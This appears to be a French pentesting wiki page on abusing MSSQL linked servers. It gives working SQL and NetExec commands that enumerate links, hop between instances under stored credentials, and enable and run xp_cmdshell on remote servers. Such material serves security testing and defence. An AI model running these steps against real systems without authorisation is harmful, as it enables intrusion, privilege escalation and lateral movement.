---
order: 4
title: "Serveurs liés MSSQL : interroger et exécuter à travers les liens de confiance"
description: "Abuser des configurations de serveurs liés SQL Server pour interroger et exécuter sur d'autres instances sous les identifiants stockés du lien, en enchaînant les liens pour le déplacement latéral et en atteignant l'exécution de commandes sur des serveurs auxquels vous ne vous êtes jamais authentifié."
keywords:
  - serveurs liés
  - openquery
  - RPC out
  - sp_linkedservers
  - déplacement latéral
---

# Serveurs liés

Un **serveur lié** permet à un SQL Server d'exécuter des requêtes sur un autre, en s'authentifiant avec des identifiants stockés dans le lien. Ces identifiants sont souvent **plus privilégiés** que les vôtres, et les liens forment souvent des chaînes entre instances, donc les énumérer et sauter de l'un à l'autre est un chemin fiable de déplacement latéral et d'escalade, parfois directement vers l'exécution de commandes sur un serveur auquel vous ne vous êtes jamais connecté.

## Énumérer et sauter

```sql
EXEC sp_linkedservers;                              -- configured links
-- run a query on the linked server under its stored credentials
SELECT * FROM OPENQUERY([LINKED-SRV], 'SELECT SUSER_SNAME(), IS_SRVROLEMEMBER(''sysadmin'')');
-- or, with RPC out enabled, EXEC ... AT the link
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED-SRV];
```

Les liens s'enchaînent : un `OPENQUERY` peut cibler un lien qui a lui-même un lien, imbriquez donc pour atteindre des instances plus profondes.

## Exécution de commandes via un lien

Si le contexte du lien est sysadmin sur l'instance distante, activez et exécutez `xp_cmdshell` là-bas (nécessite RPC out sur le lien) :

```sql
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED-SRV];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED-SRV];
EXEC ('xp_cmdshell ''whoami''') AT [LINKED-SRV];
```

```bash
# PowerUpSQL maps and crawls link chains automatically, resolving the effective rights at each hop
# Get-SQLServerLinkCrawl -Instance <srv>
# NetExec: enable cmdshell over a link
nxc mssql <target> -u user -p pass -M link_enable_cmdshell -o LINKED_SERVER=<name> ACTION=enable
```

## Notes d'exploitation

- Le levier est l'**identifiant stocké du lien** : un lien configuré avec un sysadmin ou un autre compte de domaine vous escalade quels que soient vos propres droits.
- `Get-SQLServerLinkCrawl` (PowerUpSQL) est le moyen le plus rapide de voir tout le graphe atteignable et où apparaît sysadmin, alors parcourez-le avant de sauter à la main.
- `OPENQUERY` fonctionne avec seulement des droits d'accès aux données ; `EXEC ... AT` nécessite **RPC out** activé sur le lien, ce qui est le cas de beaucoup.
- Une chaîne de liens peut franchir des frontières de domaine et de réseau que le réseau direct ne peut pas, traitez donc les liens comme une couche de routage, pas seulement comme une fonctionnalité de requête.

## Outils

- **PowerUpSQL** (`Get-SQLServerLinkCrawl -Query`) : parcourir le graphe de liens et exécuter une requête sur chaque instance atteignable.
- **Impacket `mssqlclient.py`** (`enum_links`) : lister et utiliser les liens de manière interactive.
- **NetExec `mssql`** (`-M link_enable_cmdshell`) : activer l'exécution de commandes via un lien.

## Références

- [NetExec: MSSQL linked servers](https://www.netexec.wiki/mssql-protocol)
- [PowerUpSQL: linked server crawling](https://github.com/NetSPI/PowerUpSQL/wiki)
- [Microsoft: sp_linkedservers](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-linkedservers-transact-sql)
